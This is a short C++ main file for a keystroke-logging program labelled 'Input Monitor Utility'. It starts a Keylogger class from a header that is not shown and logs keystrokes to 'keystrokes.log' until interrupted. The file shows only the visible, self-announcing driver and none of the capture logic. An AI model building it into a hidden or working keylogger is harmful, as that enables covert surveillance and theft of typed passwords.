#include <iostream>
#include <csignal>
#include "keylogger.h"

Keylogger* global_logger = nullptr;

void signal_handler(int signum) {
    std::cout << "\nInterrupt signal (" << signum << ") received.\n";
    if (global_logger) {
        global_logger->stop();
    }
    exit(signum);
}

int main() {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);

    std::cout << "Input Monitor Utility v1.0.0\n";
    std::cout << "Logging keystrokes to 'keystrokes.log'\n";
    std::cout << "Press Ctrl+C to stop.\n";

    Keylogger logger;
    global_logger = &logger;
    logger.start("keystrokes.log");

    return 0;
}